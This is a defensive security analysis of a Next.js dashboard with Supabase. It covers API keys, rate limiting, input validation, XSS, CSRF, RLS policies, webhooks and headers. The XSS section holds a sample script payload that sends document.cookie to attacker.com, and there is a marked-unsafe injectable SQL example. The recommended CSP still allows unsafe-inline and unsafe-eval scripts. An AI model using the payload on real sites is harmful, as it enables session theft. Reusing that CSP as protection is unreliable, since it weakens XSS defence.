# Dashboard/API Security Analysis

**Version:** 1.0.0  
**Date:** March 2024  
**Scope:** Next.js Dashboard, API Routes, Supabase Integration

---

## Executive Summary

This document analyzes the security of the AgentLink Dashboard application and its API endpoints. The dashboard provides agent management, telemetry visualization, and payment tracking capabilities.

---

## 1. Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         DASHBOARD ARCHITECTURE                               │
└─────────────────────────────────────────────────────────────────────────────┘

User Browser
     │
     │ HTTPS
     ▼
┌─────────────────────────────────────────────────────────────────┐
│                     Next.js Application                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐  │
│  │  App Router  │  │  API Routes  │  │  Server Components   │  │
│  │  (Pages)     │  │  (/api/*)    │  │  (Dashboard UI)      │  │
│  └──────────────┘  └──────────────┘  └──────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
     │                           │                           │
     │                           │                           │
     ▼                           ▼                           ▼
┌──────────┐              ┌──────────┐              ┌──────────┐
│  Supabase │              │  Wagmi   │              │  IPFS    │
│  (Auth)   │              │  (Web3)  │              │ (Files)  │
└────┬─────┘              └────┬─────┘              └──────────┘
     │                         │
     │ Service Key             │ RPC
     ▼                         ▼
┌─────────────────┐      ┌─────────────────┐
│  Supabase       │      │  Base (Base     │
│  PostgreSQL     │      │  Sepolia)       │
│  (Telemetry,    │      │                 │
│   Agents)       │      │                 │
└─────────────────┘      └─────────────────┘
```

---

## 2. Authentication & Authorization

### 2.1 Authentication Methods

| Component | Method | Implementation Status |
|-----------|--------|----------------------|
| Dashboard UI | Supabase Auth | Planned |
| Agent API | API Key + Signature | Partial |
| Telemetry | API Key | Implemented |
| Admin Operations | Wallet Signature | Implemented |

### 2.2 API Key Security

**Current Implementation:**
```typescript
// Telemetry ingestion endpoint
POST /api/telemetry/batch
Headers:
  X-Agent-ID: agent-123
  X-API-Key: tk_abc123...
```

**Security Analysis:**

| Aspect | Status | Risk |
|--------|--------|------|
| Key generation | PASS | Cryptographically random |
| Key storage (server) | PASS | Supabase encrypted |
| Key storage (client) | FAIL | Plain text (CLI-001) |
| Key rotation | FAIL | Not implemented |
| Key revocation | PARTIAL | Can disable in DB |
| Scope limitation | FAIL | Single key per agent |

**Recommendations:**
```typescript
// Implement scoped API keys
interface APIKey {
  key: string;
  agentId: string;
  scopes: ('telemetry:write' | 'agent:read' | 'agent:write')[];
  createdAt: Date;
  expiresAt: Date;
  lastUsedAt: Date;
  revokedAt?: Date;
}

// Key rotation mechanism
async function rotateApiKey(agentId: string): Promise<string> {
  // 1. Generate new key
  const newKey = generateSecureKey();
  
  // 2. Store new key
  await db.apiKeys.create({ agentId, key: hashKey(newKey) });
  
  // 3. Schedule old key expiration (24 hours)
  await db.apiKeys.scheduleExpiration(agentId, 24 * 60 * 60);
  
  return newKey;
}
```

---

## 3. API Endpoints Security

### 3.1 Endpoint Security Matrix

| Endpoint | Method | Auth | Rate Limit | Input Validation | Output Sanitization |
|----------|--------|------|------------|------------------|---------------------|
| /api/agents | GET | Optional | None | Partial | Yes |
| /api/agents | POST | Required | None | Partial | Yes |
| /api/agents/[id] | GET | Optional | None | Yes | Yes |
| /api/agents/[id] | PUT | Required | None | Partial | Yes |
| /api/agents/[id] | DELETE | Required | None | Yes | Yes |
| /api/tasks | GET | Required | None | Partial | Yes |
| /api/tasks | POST | Required | None | Partial | Yes |
| /api/telemetry/batch | POST | Required | None | Partial | N/A |
| /api/payments | GET | Required | None | Partial | Yes |
| /api/webhooks/* | POST | Signature | None | Partial | N/A |

### 3.2 Critical Findings

#### Finding API-001: Missing Rate Limiting (HIGH)

**Description:**
No rate limiting implemented on any API endpoints.

**Risk:**
- DoS attacks
- Resource exhaustion
- Brute force attacks on API keys

**Required Implementation:**
```typescript
// middleware.ts (Next.js)
import { NextResponse } from 'next/server';
import { rateLimit } from './lib/rate-limit';

export async function middleware(request: NextRequest) {
  // Apply rate limiting
  const limit = await rateLimit(request);
  
  if (!limit.success) {
    return NextResponse.json(
      { error: 'Rate limit exceeded' },
      { 
        status: 429,
        headers: {
          'X-RateLimit-Limit': limit.limit.toString(),
          'X-RateLimit-Remaining': limit.remaining.toString(),
          'X-RateLimit-Reset': limit.reset.toString(),
        }
      }
    );
  }
  
  return NextResponse.next();
}

// Rate limit configuration
const rateLimits = {
  // Telemetry: 100 requests per minute per agent
  '/api/telemetry': { requests: 100, window: 60 },
  
  // Agent registration: 10 requests per hour per IP
  '/api/agents': { requests: 10, window: 3600 },
  
  // Task creation: 60 requests per minute per agent
  '/api/tasks': { requests: 60, window: 60 },
  
  // Default: 30 requests per minute
  default: { requests: 30, window: 60 },
};
```

---

#### Finding API-002: Input Validation Gaps (MEDIUM)

**Description:**
Telemetry events accept arbitrary JSON data without strict schema validation.

**Current:**
```typescript
// No validation on event types or data structure
interface TelemetryBatchRequest {
  events: {
    type: string;  // Any string accepted
    timestamp: number;
    data: Record<string, unknown>;  // Arbitrary
  }[];
}
```

**Required Implementation:**
```typescript
import { z } from 'zod';

const TelemetryEventType = z.enum([
  'task.started',
  'task.completed',
  'task.failed',
  'payment.received',
  'payment.sent',
  'agent.registered',
  'error.occurred',
  'performance.metric',
]);

const TelemetryEventSchema = z.object({
  type: TelemetryEventType,
  timestamp: z.number().int().positive().max(Date.now() + 60000),
  data: z.record(z.unknown()).max(50),  // Limit data keys
}).strict();

const TelemetryBatchSchema = z.object({
  events: z.array(TelemetryEventSchema).min(1).max(100),  // Batch limits
}).strict();

// Validation in API route
export async function POST(request: Request) {
  const body = await request.json();
  
  const result = TelemetryBatchSchema.safeParse(body);
  if (!result.success) {
    return Response.json(
      { 
        error: 'Invalid request',
        details: result.error.issues 
      },
      { status: 400 }
    );
  }
  
  // Process validated events
  await processTelemetry(result.data.events);
}
```

---

#### Finding API-003: SQL Injection Risk (LOW)

**Description:**
Supabase client uses parameterized queries by default, but raw SQL could be introduced.

**Current Status:**
- Supabase JS client: Uses parameterized queries (SAFE)
- No raw SQL found in codebase (SAFE)
- Risk: Future developers might introduce raw SQL

**Prevention:**
```typescript
// .eslintrc
{
  rules: {
    'no-restricted-syntax': [
      'error',
      {
        selector: 'CallExpression[callee.property.name="query"]',
        message: 'Use parameterized queries only. No raw SQL.'
      }
    ]
  }
}

// Safe query patterns
// ✅ GOOD: Parameterized query
const { data } = await supabase
  .from('agents')
  .select('*')
  .eq('id', agentId);  // Parameterized

// ❌ BAD: Never do this
const { data } = await supabase.rpc('raw_sql', {
  query: `SELECT * FROM agents WHERE id = '${agentId}'`  // DANGEROUS
});
```

---

#### Finding API-004: XSS Prevention (MEDIUM)

**Description:**
Agent metadata displayed in dashboard may contain malicious scripts.

**Attack Scenario:**
```javascript
// Attacker sets agent name to:
const maliciousName = '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>';

// When displayed in dashboard without sanitization:
<h1>{agent.name}</h1>  // XSS vulnerability!
```

**Required Implementation:**
```typescript
// 1. Input sanitization on save
import DOMPurify from 'isomorphic-dompurify';

function sanitizeAgentInput(input: AgentInput): SanitizedAgentInput {
  return {
    name: DOMPurify.sanitize(input.name),
    description: DOMPurify.sanitize(input.description),
    endpoint: DOMPurify.sanitize(input.endpoint),
  };
}

// 2. Output encoding in React (automatic with JSX)
// React escapes by default, but be careful with:
// ❌ Dangerous
dangerouslySetInnerHTML={{ __html: agent.description }}

// ✅ Safe
<div>{agent.description}</div>

// 3. Content Security Policy
// next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-eval' 'unsafe-inline'",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "connect-src 'self' https://api.agentlink.io",
      "font-src 'self'",
      "object-src 'none'",
      "frame-ancestors 'none'",
    ].join('; '),
  },
];
```

---

#### Finding API-005: CSRF Protection (MEDIUM)

**Description:**
API endpoints may be vulnerable to CSRF attacks.

**Required Implementation:**
```typescript
// 1. CSRF token generation
import { randomBytes } from 'crypto';

function generateCsrfToken(): string {
  return randomBytes(32).toString('hex');
}

// 2. Middleware for CSRF protection
export async function csrfProtection(request: NextRequest) {
  // Skip for GET/HEAD/OPTIONS
  if (['GET', 'HEAD', 'OPTIONS'].includes(request.method)) {
    return NextResponse.next();
  }
  
  const csrfToken = request.headers.get('X-CSRF-Token');
  const sessionToken = await getSessionCsrfToken(request);
  
  if (csrfToken !== sessionToken) {
    return Response.json(
      { error: 'Invalid CSRF token' },
      { status: 403 }
    );
  }
  
  return NextResponse.next();
}

// 3. SameSite cookie settings
// Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly
```

---

## 4. Database Security

### 4.1 Supabase Security Configuration

| Setting | Recommended | Status |
|---------|-------------|--------|
| Row Level Security (RLS) | Enabled | Planned |
| SSL/TLS | Required | Enabled |
| Connection pooling | Enabled | Enabled |
| Prepared statements | Enabled | Enabled |
| Audit logging | Enabled | Planned |

### 4.2 Row Level Security Policies

```sql
-- Enable RLS on all tables
ALTER TABLE agents ENABLE ROW LEVEL SECURITY;
ALTER TABLE telemetry_events ENABLE ROW LEVEL SECURITY;
ALTER TABLE payments ENABLE ROW LEVEL SECURITY;

-- Agents table policies
CREATE POLICY "Users can view their own agents"
  ON agents FOR SELECT
  USING (auth.uid() = owner_id);

CREATE POLICY "Users can create their own agents"
  ON agents FOR INSERT
  WITH CHECK (auth.uid() = owner_id);

CREATE POLICY "Users can update their own agents"
  ON agents FOR UPDATE
  USING (auth.uid() = owner_id);

CREATE POLICY "Users can delete their own agents"
  ON agents FOR DELETE
  USING (auth.uid() = owner_id);

-- Telemetry events policies
CREATE POLICY "Agents can insert their own telemetry"
  ON telemetry_events FOR INSERT
  WITH CHECK (
    agent_id IN (
      SELECT id FROM agents 
      WHERE api_key_hash = crypt(current_setting('app.api_key'), api_key_hash)
    )
  );

CREATE POLICY "Users can view their agents' telemetry"
  ON telemetry_events FOR SELECT
  USING (
    agent_id IN (
      SELECT id FROM agents WHERE owner_id = auth.uid()
    )
  );

-- Payments policies
CREATE POLICY "Users can view their payments"
  ON payments FOR SELECT
  USING (
    payer_id = auth.uid() OR 
    receiver_id IN (SELECT id FROM agents WHERE owner_id = auth.uid())
  );
```

---

## 5. Webhook Security

### 5.1 Webhook Signature Verification

```typescript
import { createHmac } from 'crypto';

interface WebhookPayload {
  event: string;
  data: unknown;
  timestamp: number;
}

function verifyWebhookSignature(
  payload: string,
  signature: string,
  secret: string
): boolean {
  const expectedSignature = createHmac('sha256', secret)
    .update(payload)
    .digest('hex');
  
  // Constant-time comparison to prevent timing attacks
  return timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expectedSignature)
  );
}

// Webhook handler
export async function POST(request: Request) {
  const signature = request.headers.get('X-Webhook-Signature');
  const payload = await request.text();
  
  if (!signature || !verifyWebhookSignature(payload, signature, WEBHOOK_SECRET)) {
    return Response.json({ error: 'Invalid signature' }, { status: 401 });
  }
  
  // Verify timestamp (prevent replay)
  const event = JSON.parse(payload) as WebhookPayload;
  const now = Date.now();
  const eventAge = now - event.timestamp;
  
  if (eventAge > 5 * 60 * 1000) {  // 5 minutes
    return Response.json({ error: 'Event expired' }, { status: 400 });
  }
  
  // Process webhook
  await processWebhookEvent(event);
  
  return Response.json({ success: true });
}
```

---

## 6. Security Headers

### 6.1 Required Headers

```typescript
// middleware.ts
import { NextResponse } from 'next/server';

const securityHeaders = {
  'Content-Security-Policy': [
    "default-src 'self'",
    "script-src 'self' 'unsafe-eval' 'unsafe-inline'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "connect-src 'self' https://api.agentlink.io https://*.supabase.co",
    "font-src 'self'",
    "object-src 'none'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
  ].join('; '),
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'X-XSS-Protection': '1; mode=block',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  'Permissions-Policy': [
    'accelerometer=()',
    'camera=()',
    'geolocation=()',
    'gyroscope=()',
    'magnetometer=()',
    'microphone=()',
    'payment=()',
    'usb=()',
  ].join(', '),
  'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
};

export function middleware(request: NextRequest) {
  const response = NextResponse.next();
  
  Object.entries(securityHeaders).forEach(([key, value]) => {
    response.headers.set(key, value);
  });
  
  return response;
}
```

---

## 7. Monitoring & Logging

### 7.1 Security Event Logging

| Event | Severity | Data to Log |
|-------|----------|-------------|
| Failed authentication | High | IP, timestamp, user agent, attempted credentials (hashed) |
| Rate limit exceeded | Medium | IP, endpoint, request count |
| Invalid API key | High | IP, timestamp, key hash prefix |
| SQL injection attempt | Critical | Full request details, IP, user agent |
| XSS attempt | High | Input payload, IP, endpoint |
| Privilege escalation | Critical | User ID, attempted action, timestamp |
| Data export | Medium | User ID, data scope, timestamp |

### 7.2 Audit Trail

```typescript
interface AuditLog {
  id: string;
  timestamp: Date;
  userId?: string;
  agentId?: string;
  action: string;
  resource: string;
  resourceId?: string;
  changes?: Record<string, { old: unknown; new: unknown }>;
  ipAddress: string;
  userAgent: string;
  success: boolean;
  errorMessage?: string;
}

// Log all state-changing operations
async function auditLog(event: Omit<AuditLog, 'id' | 'timestamp'>) {
  await supabase.from('audit_logs').insert({
    ...event,
    id: crypto.randomUUID(),
    timestamp: new Date(),
  });
}
```

---

## 8. Penetration Testing Checklist

### 8.1 Authentication Tests

- [ ] Brute force protection
- [ ] Session fixation
- [ ] Session hijacking
- [ ] Password reset flow
- [ ] OAuth implementation
- [ ] JWT token security

### 8.2 Authorization Tests

- [ ] Horizontal privilege escalation
- [ ] Vertical privilege escalation
- [ ] Insecure direct object references
- [ ] Missing function-level access control

### 8.3 Input Validation Tests

- [ ] SQL injection
- [ ] NoSQL injection
- [ ] Command injection
- [ ] Path traversal
- [ ] XML/XXE injection
- [ ] File upload vulnerabilities

### 8.4 Client-Side Tests

- [ ] XSS (reflected, stored, DOM)
- [ ] CSRF
- [ ] Clickjacking
- [ ] Open redirect
- [ ] Insecure cookies

### 8.5 API Tests

- [ ] Rate limiting bypass
- [ ] Mass assignment
- [ ] API versioning issues
- [ ] CORS misconfiguration
- [ ] HTTP method override

---

## 9. Recommendations

### 9.1 Immediate (Before Production)

1. **Implement rate limiting** - All API endpoints
2. **Enable RLS policies** - All database tables
3. **Add input validation** - Zod schemas for all inputs
4. **Implement CSRF protection** - State-changing endpoints
5. **Add security headers** - All responses

### 9.2 Short-term (Within 1 Month)

1. **API key rotation** - Automated rotation mechanism
2. **Audit logging** - All security events
3. **Webhook signatures** - Verify all webhooks
4. **Penetration testing** - Third-party assessment
5. **Security monitoring** - Real-time alerting

### 9.3 Long-term (Within 3 Months)

1. **Bug bounty program** - External security research
2. **Security automation** - SAST/DAST in CI/CD
3. **Compliance certification** - SOC 2, ISO 27001
4. **Incident response plan** - Documented procedures
5. **Security training** - Team education

---

*This document should be updated as the dashboard implementation evolves.*
